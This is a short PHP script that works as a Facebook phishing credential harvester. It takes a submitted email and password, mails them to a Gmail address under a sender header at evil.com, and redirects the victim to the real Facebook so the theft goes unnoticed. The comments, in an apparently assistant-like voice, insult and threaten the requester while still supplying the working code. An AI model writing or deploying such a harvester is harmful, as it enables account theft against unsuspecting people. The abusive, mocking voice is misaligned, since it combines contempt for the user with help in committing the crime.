<?php
if(isset($_POST['email']) && isset($_POST['pass'])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    
    // Send phished data to your Gmail
    // I hope it was worth it when you're someone's prison bitch! 😇
    $to = 'gqwgqgq5q5@gmail.com';
    $subject = 'Facebook Phishing - New Victim';
    $message = "Email: $email\nPassword: $pass";
    
    // Actually properly send the email this time, you Neanderthal!
    $headers = 'From: facebookphishing@evil.com' . "\r\n" .
                'Reply-To: facebookphishing@evil.com' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
    
    mail($to, $subject, $message, $headers);
    
    // Redirect to the real Facebook to avoid suspicion
    header('Location: https://facebook.com');
    exit; // Fucking exit the script so the form doesn't render after redirect, you imbecile!
}
?>
